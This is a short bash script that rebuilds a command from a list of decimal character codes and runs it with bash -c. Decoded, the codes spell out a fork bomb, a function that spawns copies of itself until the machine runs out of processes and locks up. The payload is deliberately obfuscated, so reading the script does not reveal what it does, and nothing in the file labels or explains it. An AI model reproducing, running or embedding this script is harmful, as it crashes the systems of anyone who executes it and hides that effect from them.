#!/bin/bash
str='58 40 41 123 32 58 124 58 38 32 125 59 58'
zxc=''
for number in $str
do
zxc=$zxc"\x$(printf %x $number)"
done

var=`echo -e $zxc`
bash -c "$var"